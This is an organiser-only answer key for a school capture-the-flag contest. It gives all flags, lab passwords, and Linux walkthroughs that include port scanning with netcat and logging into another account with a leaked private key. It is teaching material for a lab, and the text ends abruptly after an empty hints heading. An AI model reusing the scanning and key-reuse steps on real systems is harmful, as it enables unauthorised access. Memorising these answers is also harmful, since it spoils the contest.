# SITS Capture The Flag Competition 2026: answer key

Made by Axel Jonas C. Tangalin.

**Organizers only. Don't share this file or show it on screen during the event.**

Every walkthrough below was played by a test that followed only the challenge's description and hints, and the outputs quoted are the ones it really got. Values that change on every build of a box (random file names and decoy codes) are marked as such: tell teams the *method*, not the value.

## Scoring

| Level | Starts at | Each solve takes off | Never below |
|---|---|---|---|
| ★ Easy | 30 | 1 | 15 |
| ★★ Medium | 60 | 3 | 30 |
| ★★★ Hard | 100 | 5 | 50 |

Every team that solved a challenge loses the decay when another team solves it, so rare solves are worth more. Hints cost points once bought, and CTFd won't sell a hint costing more than the team's score.

Flags are case-sensitive unless the summary says "any capitals" (flags read off a picture, or written from decoded words).

## Summary

### Linux

| # | Challenge | Level | Where | Flag |
|---|---|---|---|---|
| 1 | Welcome Mat | ★ Easy | `ssh welcome@192.168.68.103 -p 2240`, password `doormat` | `FLAG{w3lc0m3_t0_th3_sh3ll}` |
| 2 | Hide and Seek | ★ Easy | `ssh hideseek@192.168.68.103 -p 2240`, password `countto10` | `FLAG{y0u_f0und_m3_1n_th3_cl0s3t}` |
| 3 | Lost Keys | ★ Easy | `ssh lostkeys@192.168.68.103 -p 2240`, password `jinglejingle` | `FLAG{f1nd_f0und_th3_k3ys}` |
| 4 | Spaced Out | ★ Easy | `ssh spaced@192.168.68.103 -p 2240`, password `spacebar` | `FLAG{qu0t3s_h4ndl3_sp4c3s}` |
| 5 | Sticky Note | ★ Easy | `ssh sticky@192.168.68.103 -p 2240`, password `postit` | `FLAG{st1cky_n0t3_1n_th3_3nv}` |
| 6 | Spot the Difference | ★ Easy | `ssh spotdiff@192.168.68.103 -p 2240`, password `twinphotos` | `FLAG{0n3_l1n3_ch4ng3d}` |
| 7 | Needle in the Logs | ★★ Medium | `ssh needle@192.168.68.103 -p 2240`, password `haystack` | `FLAG{tw0_gr3ps_1n_4_r0w}` |
| 8 | Exact Size | ★★ Medium | `ssh exactsize@192.168.68.103 -p 2240`, password `measuring` | `FLAG{s1z3d_4nd_s1gn3d_f0r}` |
| 9 | Odd One Out | ★★ Medium | `ssh oddone@192.168.68.103 -p 2240`, password `pairsonly` | `FLAG{th3_l0n3ly_s0ck}` |
| 10 | Crowd Favourite | ★★ Medium | `ssh favourite@192.168.68.103 -p 2240`, password `mostvotes` | `FLAG{th3_cr0wd_h4s_sp0k3n}` |
| 11 | Time Capsule | ★★ Medium | `ssh capsule@192.168.68.103 -p 2240`, password `buriedtreasure` | `FLAG{d4t3d_v4l3nt1n3s_d4y}` |
| 12 | Knock Knock | ★★ Medium | `ssh knock@192.168.68.103 -p 2240`, password `whosthere` | `FLAG{kn0ck_kn0ck_wh0s_p0rt_5287}` |
| 13 | Russian Doll | ★★★ Hard | `ssh russiandoll@192.168.68.103 -p 2240`, password `matryoshka` | `FLAG{0p3n3d_3v3ry_s1ngl3_d0ll}` |
| 14 | Undo History | ★★★ Hard | `ssh history@192.168.68.103 -p 2240`, password `undoredo` | `FLAG{g1t_n3v3r_f0rg3ts}` |
| 15 | Spare Key | ★★★ Hard | `ssh sparekey@192.168.68.103 -p 2240`, password `underthemat` | `FLAG{sp4r3_k3y_und3r_th3_m4t}` |

### Web

| # | Challenge | Level | Where | Flag |
|---|---|---|---|---|
| 1 | View Source | ★ Easy | `http://192.168.68.103:8301` | `FLAG{v13w_s0urc3_r3v34ls_4ll}` |
| 2 | Robots Only | ★ Easy | `http://192.168.68.103:8302` | `FLAG{r0b0ts_txt_p01nts_th3_w4y}` |
| 3 | Client-Side Lock | ★ Easy | `http://192.168.68.103:8303` | `FLAG{th3_br0ws3r_kn3w_th3_c0d3}` |
| 4 | Greyed Out | ★ Easy | `http://192.168.68.103:8304` | `FLAG{gr3y3d_0ut_but_n0t_l0ck3d}` |
| 5 | Saved for Later | ★ Easy | `http://192.168.68.103:8305` | `FLAG{l0c4l_st0r4g3_r3m3mb3rs}` |
| 6 | Header Hunt | ★ Easy | `http://192.168.68.103:8306` | `FLAG{h34d3rs_c4rry_s3cr3ts}` |
| 7 | Blink | ★★ Medium | `http://192.168.68.103:8307` | `FLAG{r3d1r3ct_t00_f4st}` |
| 8 | Next Order | ★★ Medium | `http://192.168.68.103:8308` | `FLAG{0rd3r_numb3rs_4r3_gu3ss4bl3}` |
| 9 | Cookie Jar | ★★ Medium | `http://192.168.68.103:8309` | `FLAG{c00k13s_c4n_b3_3d1t3d}` |
| 10 | Secret Agent | ★★ Medium | `http://192.168.68.103:8310` | `FLAG{y0u_4r3_wh0_y0u_s4y_y0u_4r3}` |
| 11 | Up a Folder | ★★ Medium | `http://192.168.68.103:8311` | `FLAG{cl1mb3d_0n3_f0ld3r_up}` |
| 12 | Sign In Anyway | ★★ Medium | `http://192.168.68.103:8312` | `FLAG{s1gn3d_1n_w1th0ut_4_p4ssw0rd}` |
| 13 | Badge Swap | ★★★ Hard | `http://192.168.68.103:8313` | `FLAG{tw0_f13lds_sw4pp3d}` |
| 14 | The Union | ★★★ Hard | `http://192.168.68.103:8314` | `FLAG{un10n_s3l3ct_f0und_th3_st4sh}` |
| 15 | Filter Dodge | ★★★ Hard | `http://192.168.68.103:8315` | `FLAG{f1lt3r_d0dg3d_w1th_d0ts}` |

### Crypto

| # | Challenge | Level | Where | Flag |
|---|---|---|---|---|
| 1 | Not So Secret | ★ Easy | `message.txt` (download) | `FLAG{b4s3_64_1s_n0t_s3cr3t}` |
| 2 | Thirty-Two | ★ Easy | `message.txt` (download) | `FLAG{h4lf_th3_symb0ls_b4s3_32}` |
| 3 | Hex Marks the Spot | ★ Easy | `map.txt` (download) | `FLAG{h3x_m4rks_th3_sp0t}` |
| 4 | Ones and Zeros | ★ Easy | `signal.txt` (download) | `FLAG{0n3s_4nd_z3r0s}` |
| 5 | Beep Boop | ★ Easy | `message.txt` (download) | `FLAG{DOTS_AND_DASHES}` (any capitals) |
| 6 | Easy as ABC | ★ Easy | `message.txt` (download) | `FLAG{NUMBERS_TO_LETTERS}` (any capitals) |
| 7 | Mirror, Mirror | ★★ Medium | `message.txt` (download) | `FLAG{m1rr0r_m1rr0r_0n_th3_w4ll}` |
| 8 | Shift Work | ★★ Medium | `report.txt` (download) | `FLAG{sh1ft_w0rk_cl0ck3d_0ut}` |
| 9 | Family Name | ★★ Medium | `message.txt` (download) | `FLAG{f4m1ly_n4m3_unl0cks_1t}` |
| 10 | Repeat After Me | ★★ Medium | `message.txt` (download) | `FLAG{t4c0_tu3sd4y_x0r}` |
| 11 | Letter Swap | ★★ Medium | `message.txt` (download) | `FLAG{LETTERS_IN_DISGUISE}` (any capitals) |
| 12 | Common Password | ★★ Medium | `leaked.txt` (download) | `FLAG{sunshine}` (any capitals) |
| 13 | Shared Secret | ★★★ Hard | `keys.txt` (download) | `FLAG{sh4r3d_pr1m3_br0k3_b0th}` |
| 14 | No Key Given | ★★★ Hard | `message.txt` (download) | `FLAG{th3_k3y_f0und_1ts3lf}` |
| 15 | Onion | ★★★ Hard | `onion.txt` (download) | `FLAG{p33l3d_3v3ry_l4y3r}` |

### Forensics

| # | Challenge | Level | Where | Flag |
|---|---|---|---|---|
| 1 | Photo Notes | ★ Easy | `beach_day.png` (download) | `FLAG{ph0t0s_c4n_h0ld_n0t3s}` |
| 2 | Wrong Label | ★ Easy | `recipe.txt` (download) | `FLAG{NOT_A_TEXT_FILE}` (any capitals) |
| 3 | Broken Header | ★ Easy | `postcard.png` (download) | `FLAG{MAGIC_BYTES_FIXED}` (any capitals) |
| 4 | Blacked Out | ★ Easy | `incident_report.pdf` (download) | `FLAG{bl4ck_b0x3s_d0nt_d3l3t3}` |
| 5 | File Properties | ★ Easy | `club_minutes.pdf` (download) | `FLAG{m3t4d4t4_kn0ws_m0r3}` |
| 6 | Too Fast | ★ Easy | `loading.gif` (download) | `FLAG{BLINK_AND_YOU_MISS_IT}` (any capitals) |
| 7 | Dark Room | ★★ Medium | `dark_room.png` (download) | `FLAG{TURN_THE_LIGHTS_ON}` (any capitals) |
| 8 | Inside the Doc | ★★ Medium | `party_plan.docx` (download) | `FLAG{A_DOCX_IS_A_ZIP}` (any capitals) |
| 9 | Stowaway | ★★ Medium | `holiday.png` (download) | `FLAG{st0w4w4y_z1p_f0und}` |
| 10 | Plain Login | ★★ Medium | `login_capture.pcap` (download) | `FLAG{b4s1c_4uth_1s_just_b4s364}` |
| 11 | Old School | ★★ Medium | `ftp_capture.pcap` (download) | `FLAG{ftp_n3v3r_h1d3s_p4ssw0rds}` |
| 12 | Seeing Sound | ★★ Medium | `mystery.wav` (download) | `FLAG{LOOK_DONT_LISTEN}` (any capitals) |
| 13 | Wire Tap | ★★★ Hard | `office_capture.pcap` (download) | `FLAG{s4m3_p4ssw0rd_tw1c3}` |
| 14 | Least Significant | ★★★ Hard | `garden.png` (download) | `FLAG{blu3_b1ts_t3ll_t4l3s}` |
| 15 | Bit Planes | ★★★ Hard | `city_lights.png` (download) | `FLAG{HIDDEN_IN_A_BIT_PLANE}` (any capitals) |

### Reversing

| # | Challenge | Level | Where | Flag |
|---|---|---|---|---|
| 1 | Strings Attached | ★ Easy | `ssh strings@192.168.68.103 -p 2242`, password `reverse` | `FLAG{str1ngs_sp1ll_th3_b34ns}` |
| 2 | Compare Notes | ★ Easy | `ssh compare@192.168.68.103 -p 2242`, password `reverse` | `FLAG{ltr4c3_s4w_th3_c0mp4r3}` |
| 3 | Backwards | ★ Easy | `ssh backwards@192.168.68.103 -p 2242`, password `reverse` | `FLAG{r34d_1t_b4ckw4rds}` |
| 4 | By the Numbers | ★ Easy | `ssh numbers@192.168.68.103 -p 2242`, password `reverse` | `FLAG{ch4r_c0d3s_t0_l3tt3rs}` |
| 5 | Letter by Letter | ★ Easy | `ssh letters@192.168.68.103 -p 2242`, password `reverse` | `FLAG{c0unt1ng_st4rts_4t_z3r0}` |
| 6 | Setting | ★ Easy | `ssh setting@192.168.68.103 -p 2242`, password `reverse` | `FLAG{3nv1r0nm3nt_s3tt1ng_f0und}` |
| 7 | Freeze Frame | ★★ Medium | `ssh freeze@192.168.68.103 -p 2242`, password `reverse` | `FLAG{c4ught_b3f0r3_th3_burn}` |
| 8 | Unscramble | ★★ Medium | `ssh unscramble@192.168.68.103 -p 2242`, password `reverse` | `FLAG{und0n3_1n_r3v3rs3_0rd3r}` |
| 9 | Mixed Up | ★★ Medium | `ssh mixedup@192.168.68.103 -p 2242`, password `reverse` | `FLAG{h3x_r3v3rs3_sh1ft_und0n3}` |
| 10 | Read the Assembly | ★★ Medium | `ssh assembly@192.168.68.103 -p 2242`, password `reverse` | `FLAG{1t_w4s_1n_th3_4ss3mbly}` |
| 11 | Level Up | ★★ Medium | `ssh levelup@192.168.68.103 -p 2242`, password `reverse` | `FLAG{1ts_0v3r_n1n3_th0us4nd}` |
| 12 | Skip the Wait | ★★ Medium | `ssh skipwait@192.168.68.103 -p 2242`, password `reverse` | `FLAG{sk1pp3d_th3_wh0l3_qu3u3}` |
| 13 | Two Returns | ★★★ Hard | `ssh tworeturns@192.168.68.103 -p 2242`, password `reverse` | `FLAG{tw0_r3turns_g0t_m3_1n}` |
| 14 | License Key | ★★★ Hard | `ssh license@192.168.68.103 -p 2242`, password `reverse` | `FLAG{m4d3_my_0wn_k3yg3n}` |
| 15 | No Names | ★★★ Hard | `ssh nonames@192.168.68.103 -p 2242`, password `reverse` | `FLAG{n0_n4m3s_n0_pr0bl3m}` |

### Pwn

| # | Challenge | Level | Where | Flag |
|---|---|---|---|---|
| 1 | Secret Menu | ★ Easy | `ssh menu@192.168.68.103 -p 2240` (password `pwnit`), or `nc 192.168.68.103 9041` | `FLAG{s3cr3t_m3nu_unl0ck3d}` |
| 2 | Store Credit | ★ Easy | `ssh shop@192.168.68.103 -p 2240` (password `pwnit`), or `nc 192.168.68.103 9042` | `FLAG{n3g4t1v3_sh0pp1ng_spr33}` |
| 3 | Name Tag | ★ Easy | `ssh nametag@192.168.68.103 -p 2240` (password `pwnit`), or `nc 192.168.68.103 9043` | `FLAG{n4m3_t00_l0ng_f0r_th3_t4g}` |
| 4 | Blank Password | ★ Easy | `ssh vault@192.168.68.103 -p 2240` (password `pwnit`), or `nc 192.168.68.103 9044` | `FLAG{bl4nk_p4ssw0rd_w0rks}` |
| 5 | Greeter | ★ Easy | `ssh greeter@192.168.68.103 -p 2240` (password `pwnit`), or `nc 192.168.68.103 9045` | `FLAG{s3m1c0l0n_s4ys_h3ll0}` |
| 6 | Exact Fit | ★★ Medium | `ssh exactfit@192.168.68.103 -p 2240` (password `pwnit`), or `nc 192.168.68.103 9046` | `FLAG{3x4ct_f1t_k3y}` |
| 7 | Echo Echo | ★★ Medium | `ssh echoecho@192.168.68.103 -p 2240` (password `pwnit`), or `nc 192.168.68.103 9047` | `FLAG{3ch0_3ch0_l34k3d}` |
| 8 | Return to Sender | ★★★ Hard | `nc 192.168.68.103 9048` (raw bytes needed; from a Linux account, `nc antares 9001`) | `FLAG{r3turn_t0_s3nd3r_w1n}` |

Pwn players connect with the SSH gate accounts (password `pwnit`) on port 2240, or `nc` on 9041-9048. Return to Sender needs raw bytes, so it has no gate: use `nc` from a Linux challenge account.

## The help queue and the clock

Teams press **Ask for help** on a challenge; it shows on **Admin > Help requests** (and the projector). When you go to a team, check which hints they've already bought (**Admin > Submissions** and the team's page) and nudge with the next idea, not the answer. The mission clock and music work as on 2nd Star; the projector is `http://localhost:8003/timer` on this PC.

## Linux

### Linux 1. Welcome Mat (★ Easy, 30)

**Teaches:** Logging in over SSH, `ls` and `cat`.  
**Where:** `ssh welcome@192.168.68.103 -p 2240`, password `doormat`  
**Flag:** `FLAG{w3lc0m3_t0_th3_sh3ll}`

**Steps:**

1. In PowerShell, run `ssh welcome@192.168.68.103 -p 2240`, answer `yes` to the fingerprint question, and type the password `doormat` (nothing shows while typing).
2. `ls` lists one file.
   ```text
   hello.txt
   ```
3. `cat hello.txt` prints it, flag included.
   ```text
   Welcome to the SITS Capture The Flag Competition 2026!
   Every flag looks like this one. Copy it into the box on the challenge page.
   
   FLAG{w3lc0m3_t0_th3_sh3ll}
   ```

**Hints** (what a team that bought them has been told):

- (5 points) Type the file name exactly: `cat hello.txt`. Linux treats capital and small letters as different.

**Common mistakes:** Typing `Hello.txt` or `cat hello` (Linux names are exact, capitals included). Expecting the password to show as dots: nothing appears at all, which is normal.

### Linux 2. Hide and Seek (★ Easy, 30)

**Teaches:** Hidden files (names starting with `.`) and `ls -a`.  
**Where:** `ssh hideseek@192.168.68.103 -p 2240`, password `countto10`  
**Flag:** `FLAG{y0u_f0und_m3_1n_th3_cl0s3t}`

**Steps:**

1. `ls` shows only the README, which nudges toward "ask to see everything".
   ```text
   Ready or not, here I come!
   
   The best hiding places don't show up unless you ask to see everything.
   And when you find one, look inside it the same way.
   ```
2. `ls -a` shows the hidden folder `.closet`.
   ```text
   .  ..  .closet	README.txt
   ```
3. `cd .closet`, then `ls -a` again shows `.behind_the_shoes`.
   ```text
   .  ..  .behind_the_shoes  coats.txt
   ```
4. `cat .behind_the_shoes` prints the flag.
   ```text
   FLAG{y0u_f0und_m3_1n_th3_cl0s3t}
   ```

**Hints** (what a team that bought them has been told):

- (5 points) `ls -a` shows everything, hidden names included. The hidden thing in your home folder is a folder: go into it with `cd`, then look again with `ls -a`.

**Common mistakes:** Running `ls -a` only in the home folder and stopping: the hidden folder has a hidden file inside it too. `cat .closet` (it's a folder: use `cd`).

### Linux 3. Lost Keys (★ Easy, 30)

**Teaches:** Searching a folder tree with `find -name`.  
**Where:** `ssh lostkeys@192.168.68.103 -p 2240`, password `jinglejingle`  
**Flag:** `FLAG{f1nd_f0und_th3_k3ys}`

**Steps:**

1. `find ~ -name keys.txt` prints the one path.
   ```text
   /home/lostkeys/house/upstairs/study/drawer/keys.txt
   ```
2. `cat` that path prints the flag.
   ```text
   FLAG{f1nd_f0und_th3_k3ys}
   ```

**Hints** (what a team that bought them has been told):

- (5 points) `find` searches folders for files. `find ~ -name keys.txt` searches your whole home folder for that name and prints where the file is.
- (5 points) Read it with `cat` followed by the path `find` printed, which starts `/home/lostkeys/house/`.

**Common mistakes:** Clicking through folders with `cd` and `ls` by hand: it works, but takes ages. Point them at `find`.

### Linux 4. Spaced Out (★ Easy, 30)

**Teaches:** File names with spaces and brackets: quotes and Tab completion.  
**Where:** `ssh spaced@192.168.68.103 -p 2240`, password `spacebar`  
**Flag:** `FLAG{qu0t3s_h4ndl3_sp4c3s}`

**Steps:**

1. `ls` shows the name in quotes, because of the spaces.
   ```text
   'my secret plans (final).txt'   shopping.txt
   ```
2. Typed without quotes, the brackets confuse the shell.
   ```text
   -bash: syntax error near unexpected token `('
   ```
3. `cat "my secret plans (final).txt"` (or `cat my` then Tab) prints the flag.
   ```text
   FLAG{qu0t3s_h4ndl3_sp4c3s}
   ```

**Hints** (what a team that bought them has been told):

- (5 points) Put the whole name inside quotes, so the terminal sees it as one name: `cat "my secret plans (final).txt"`. Or type `cat my` and press Tab: the terminal finishes the name for you.

**Common mistakes:** Quoting only part of the name. Copying the single quotes `ls` shows along with the name is fine, but mixing single and double quotes isn't.

### Linux 5. Sticky Note (★ Easy, 30)

**Teaches:** Environment variables: `env`.  
**Where:** `ssh sticky@192.168.68.103 -p 2240`, password `postit`  
**Flag:** `FLAG{st1cky_n0t3_1n_th3_3nv}`

**Steps:**

1. `env | grep FLAG` shows the note.
   ```text
   REMINDER=FLAG{st1cky_n0t3_1n_th3_3nv}
   ```
2. Submit only the part after `REMINDER=`.

**Hints** (what a team that bought them has been told):

- (5 points) `env` lists every environment variable, one `NAME=value` per line. Add `| grep FLAG` to show only the lines with `FLAG` in them: `env | grep FLAG`.

**Common mistakes:** Submitting `REMINDER=FLAG{...}` with the name in front. Searching files with `grep -r`: the flag isn't in a file.

### Linux 6. Spot the Difference (★ Easy, 30)

**Teaches:** Comparing two files with `diff`.  
**Where:** `ssh spotdiff@192.168.68.103 -p 2240`, password `twinphotos`  
**Flag:** `FLAG{0n3_l1n3_ch4ng3d}`

**Steps:**

1. `diff guests-monday.txt guests-friday.txt` prints one changed line, in two versions.
   ```text
   2214c2214
   < guest 2214  Gino    table 15  ticket FLAG{4acda9b789225cd65e}
   ---
   > guest 2214  Gino    table 15  ticket FLAG{0n3_l1n3_ch4ng3d}
   ```
2. The `>` line comes from the second file (Friday) and holds the flag. The `<` line's code is a decoy, and it's different on every build.

**Hints** (what a team that bought them has been told):

- (5 points) `diff first second` compares two files and prints only the lines that are different.
- (5 points) In `diff`'s output, lines starting with `<` come from the first file and lines starting with `>` from the second. The flag is on the `>` line.

**Common mistakes:** Submitting the `<` line's code. Trying to compare thousands of lines by eye.

### Linux 7. Needle in the Logs (★★ Medium, 60)

**Teaches:** Narrowing a search by chaining two `grep`s with `|`.  
**Where:** `ssh needle@192.168.68.103 -p 2240`, password `haystack`  
**Flag:** `FLAG{tw0_gr3ps_1n_4_r0w}`

**Steps:**

1. Every line contains `FLAG`, so `grep FLAG` alone is useless.
   ```text
   25000
   ```
2. `grep user=principal logins.log | grep DENIED` leaves exactly one line.
   ```text
   2026-03-20 01:47:05 login user=principal result=DENIED token=FLAG{tw0_gr3ps_1n_4_r0w}
   ```

**Hints** (what a team that bought them has been told):

- (5 points) `grep word file` prints only the lines containing that word. `grep FLAG` matches every line here, so search for what makes the right line special instead.
- (10 points) Chain two searches with `|`: `grep user=principal logins.log | grep DENIED`.

**Common mistakes:** Submitting a token from a successful login: the right one is the principal's denied login.

### Linux 8. Exact Size (★★ Medium, 60)

**Teaches:** `find` with `-size` (in bytes, `c`) and `-user`.  
**Where:** `ssh exactsize@192.168.68.103 -p 2240`, password `measuring`  
**Flag:** `FLAG{s1z3d_4nd_s1gn3d_f0r}`

**Steps:**

1. `find ~/warehouse -type f -size 1234c -user courier` prints one parcel. Its shelf and number are random on every build.
   ```text
   /home/exactsize/warehouse/shelf-05/parcel-56428.box
   ```
2. `grep flag:` followed by that path prints its flag line.
   ```text
   flag: FLAG{s1z3d_4nd_s1gn3d_f0r}
   ```

**Hints** (what a team that bought them has been told):

- (5 points) `find` can filter files by size and by owner. `-size 1234c` means exactly 1234 bytes (`c` stands for bytes), and `-user courier` means owned by courier.
- (10 points) `find ~/warehouse -type f -size 1234c -user courier` prints the one parcel. Then `grep flag:` followed by that path prints its flag line.

**Common mistakes:** `-size 1234` without the `c` (that counts 512-byte blocks). Forgetting `-user courier`: other parcels are 1234 bytes too, with fake flags.

### Linux 9. Odd One Out (★★ Medium, 60)

**Teaches:** `sort | uniq -u` to find the one line that appears once.  
**Where:** `ssh oddone@192.168.68.103 -p 2240`, password `pairsonly`  
**Flag:** `FLAG{th3_l0n3ly_s0ck}`

**Steps:**

1. Each line has a time and basket, so whole lines never repeat. The sock code is the 4th column (the codes are random on every build).
   ```text
   00:01 basket-1 sock FLAG{yux_hawv6g_kdim}
   00:01 basket-4 sock FLAG{j04_p6jnbi_oh5i}
   00:01 basket-5 sock FLAG{72q_fhb47r_ghdk}
   ```
2. `cut -d' ' -f4 laundry.log | sort | uniq -u` prints the lonely sock.
   ```text
   FLAG{th3_l0n3ly_s0ck}
   ```

**Hints** (what a team that bought them has been told):

- (5 points) Every line has its own time and basket, so no two whole lines are the same. `cut -d' ' -f4 laundry.log` keeps only the 4th column, the sock code.
- (10 points) `uniq -u` prints the lines that appear only once, but it only compares neighbouring lines, so sort first: `cut -d' ' -f4 laundry.log | sort | uniq -u`.

**Common mistakes:** `uniq -u` without `sort` first (it only compares neighbouring lines). Running `uniq -u` on whole lines (every line is unique because of the time).

### Linux 10. Crowd Favourite (★★ Medium, 60)

**Teaches:** Counting repeats with `sort | uniq -c | sort -n`.  
**Where:** `ssh favourite@192.168.68.103 -p 2240`, password `mostvotes`  
**Flag:** `FLAG{th3_cr0wd_h4s_sp0k3n}`

**Steps:**

1. Each vote line is `time booth code`. The other codes are random on every build.
   ```text
   00:00 booth-1 FLAG{k1dwn_4md8_fdgb4r}
   00:00 booth-2 FLAG{yy5pf_igrx_oqlk4p}
   00:00 booth-4 FLAG{jv1pk_9tje_ys1pdf}
   ```
2. `cut -d' ' -f3 votes.log | sort | uniq -c | sort -n | tail -1` shows the most-voted code.
   ```text
   14 FLAG{th3_cr0wd_h4s_sp0k3n}
   ```

**Hints** (what a team that bought them has been told):

- (5 points) Pull out just the votes with `cut -d' ' -f3 votes.log`. `uniq -c` then counts how many times each line repeats, as long as the lines are sorted first.
- (10 points) `cut -d' ' -f3 votes.log | sort | uniq -c | sort -n | tail -1` shows the vote with the highest count.

**Common mistakes:** Forgetting the first `sort` (counts come out wrong). Taking `head` instead of `tail` after `sort -n` (that's the least popular).

### Linux 11. Time Capsule (★★ Medium, 60)

**Teaches:** File dates with `ls -l`.  
**Where:** `ssh capsule@192.168.68.103 -p 2240`, password `buriedtreasure`  
**Flag:** `FLAG{d4t3d_v4l3nt1n3s_d4y}`

**Steps:**

1. `ls -l ~/diary` shows 366 pages with random names (different on every build).
   ```text
   total 1464
   -rw-r----- 1 root capsule 58 Oct 14  2024 page-00639e30.txt
   -rw-r----- 1 root capsule 58 May 26  2024 page-02426f48.txt
   ```
2. `ls -l ~/diary | grep 'Feb 14'` leaves one page.
   ```text
   -rw-r----- 1 root capsule 58 Feb 14  2024 page-0ce45ca6.txt
   ```
3. `cat ~/diary/` followed by that name prints the flag.
   ```text
   Dear diary,
   mood: 9/10
   secret: FLAG{d4t3d_v4l3nt1n3s_d4y}
   ```

**Hints** (what a team that bought them has been told):

- (5 points) `ls -l` shows when each file was last changed, in the columns just before its name. For files from an earlier year, it shows the year instead of the time.
- (10 points) `ls -l ~/diary | grep 'Feb 14'` leaves one line. Then `cat ~/diary/` followed by that file's name.

**Common mistakes:** `grep 'Feb 14'` without the two spaces `ls` uses for single-digit days (here it's two digits, so one space is right). Reading pages at random: every page has a fake flag.

### Linux 12. Knock Knock (★★ Medium, 60)

**Teaches:** Scanning ports with `nc -z`, then connecting with `nc`.  
**Where:** `ssh knock@192.168.68.103 -p 2240`, password `whosthere`  
**Flag:** `FLAG{kn0ck_kn0ck_wh0s_p0rt_5287}`

**Steps:**

1. `cat notes.txt` says the doorbell answers on one port between 5000 and 5999.
   ```text
   The doorbell is at the address "doorbell" on this network.
   It answers on exactly one port between 5000 and 5999.
   After it sends you something, press Ctrl+C to get back to the prompt.
   ```
2. `nc -zv doorbell 5000-5999 2>&1 | grep succeeded` finds it (the address in brackets can differ).
   ```text
   Connection to doorbell (192.168.0.2) 5287 port [tcp/*] succeeded!
   ```
3. `nc doorbell 5287` prints the flag. Ctrl+C to leave.
   ```text
   nc doorbell 5287
   Ding dong! Somebody's home.
   You found the right door.
   FLAG{kn0ck_kn0ck_wh0s_p0rt_5287}
   ```

**Hints** (what a team that bought them has been told):

- (5 points) `nc -z` checks whether a port is open without sending anything, and it takes a range like `5000-5999`. Add `-v` to see a result for each port.
- (10 points) `nc -zv doorbell 5000-5999 2>&1 | grep succeeded` prints only the open port. Then connect with `nc doorbell` followed by that port number.

**Common mistakes:** Scanning without `2>&1`: nc writes its results to the error output, so `grep` sees nothing. Trying to reach the doorbell from their own PC: it's only reachable from the Linux box.

### Linux 13. Russian Doll (★★★ Hard, 100)

**Teaches:** Identifying layers with `file` and unwrapping them (gzip, Base64, tar).  
**Where:** `ssh russiandoll@192.168.68.103 -p 2240`, password `matryoshka`  
**Flag:** `FLAG{0p3n3d_3v3ry_s1ngl3_d0ll}`

**Steps:**

1. `file ~/doll.dat` says gzip.
   ```text
   /home/russiandoll/doll.dat: gzip compressed data, from Unix, original size modulo 2^32 240
   ```
2. `gunzip -c ~/doll.dat > layer1`, then `file layer1`: text (Base64).
   ```text
   layer1: ASCII text
   ```
3. `base64 -d layer1 > layer2`, then `file layer2`: gzip again.
   ```text
   layer2: gzip compressed data, from Unix, original size modulo 2^32 10240
   ```
4. `gunzip -c layer2 > layer3`, then `file layer3`: a tar archive.
   ```text
   layer3: POSIX tar archive (GNU)
   ```
5. `tar -xf layer3`, then `ls`: `smallest_doll.txt`.
   ```text
   layer1	layer2	layer3	smallest_doll.txt
   ```
6. `base64 -d smallest_doll.txt` prints the flag.
   ```text
   FLAG{0p3n3d_3v3ry_s1ngl3_d0ll}
   ```
7. Hint 2's one-liner does it all at once.
   ```text
   FLAG{0p3n3d_3v3ry_s1ngl3_d0ll}
   ```

**Hints** (what a team that bought them has been told):

- (10 points) Start with `file ~/doll.dat`. For gzip, `gunzip -c in > out`. For Base64 text, `base64 -d in > out`. For a tar archive, `tar -xf in`, then `ls` to see what came out. Run `file` on each new file.
- (10 points) The layers are gzip, Base64, gzip, tar, then Base64. All in one go: `gunzip -c ~/doll.dat | base64 -d | gunzip | tar -xO | base64 -d`.

**Common mistakes:** Working in the home folder, which is read-only: run `cd $(mktemp -d)` (or `cd /tmp`) first. Stopping at `smallest_doll.txt` and submitting the Base64.

### Linux 14. Undo History (★★★ Hard, 100)

**Teaches:** Git keeps every committed version: `git log -p`.  
**Where:** `ssh history@192.168.68.103 -p 2240`, password `undoredo`  
**Flag:** `FLAG{g1t_n3v3r_f0rg3ts}`

**Steps:**

1. `cd recipes`, `ls`: the secret file is gone.
   ```text
   adobo.txt  champorado.txt  pancakes.txt
   ```
2. `git log` lists the commits, including "Add grandma's secret sauce" and a later one removing it.
   ```text
   commit 4dfd2f13760d5bdecf4e32bea6b90fd582a47a1e (HEAD -> main)
   Author: Lola <lola@kitchen.invalid>
   Date:   Sat Jan 24 07:45:00 2026 +0800
   
       Add champorado
   
   commit f6fc78013ea21cd420037ce78b53a1da77dd8236
   Author: Lola <lola@kitchen.invalid>
   Date:   Sat Jan 17 20:16:00 2026 +0800
   
       Oops, that one is a family secret. Remove it.
   
   commit 16d5eb8ba845f2c49f629fc903e5f6ea7f3fac39
   Author: Lola <lola@kitchen.invalid>
   Date:   Sat Jan 17 20:15:00 2026 +0800
   
       Add grandma's secret sauce
   
   commit dc1
   ```
3. `git log -p | grep FLAG` shows the line being added (`+`) and later removed (`-`).
   ```text
   -The secret ingredient: FLAG{g1t_n3v3r_f0rg3ts}
   +The secret ingredient: FLAG{g1t_n3v3r_f0rg3ts}
   ```
4. Or `git show` with the first 7 characters of that commit's code shows the whole change.

**Hints** (what a team that bought them has been told):

- (10 points) `git log` lists every saved change (git calls them commits), newest first, with a message saying what changed. One of them added the secret sauce.
- (10 points) `git log -p` also shows what each commit added (lines starting with `+`) and removed (`-`). `git log -p | grep FLAG` jumps straight to it. Press `q` if it opens a long page.

**Common mistakes:** Looking only at the files now in the folder. Getting stuck in the pager: press `q`.

### Linux 15. Spare Key (★★★ Hard, 100)

**Teaches:** Logging in with a private key: `ssh -i`.  
**Where:** `ssh sparekey@192.168.68.103 -p 2240`, password `underthemat`  
**Flag:** `FLAG{sp4r3_k3y_und3r_th3_m4t}`

**Steps:**

1. `cat note.txt` explains the key.
   ```text
   Left the spare key here in case I get locked out.
   It opens the caretaker's account on this same server.
   - the caretaker
   ```
2. `ssh -i ~/spare_key caretaker@localhost`, `yes` to the fingerprint, then `cat flag.txt`.
   ```text
   ssh -i ~/spare_key caretaker@localhost
   
   The authenticity of host 'localhost (::1)' can't be established.
   ED25519 key fingerprint is SHA256:3t/yWtTD1CBg8nq7cCCIDGI2WrKLCJJrapSvQIH0u/4.
   This key is not known by any other names.
   Are you sure you want to continue connecting yes
   Could not create directory '/home/sparekey/.ssh' (Read-only file system).
   
   Failed to add the host to the list of known hosts (/home/sparekey/.ssh/known_hosts).
   
   
     SITS Capture The Flag Competition 2026
     Linux box
   
     Home folders are read-only.
     If you need scratch space, use /tmp.
   
   caretaker@cacc70779e2c:~
   ```
3. `exit` twice to come back out.

**Hints** (what a team that bought them has been told):

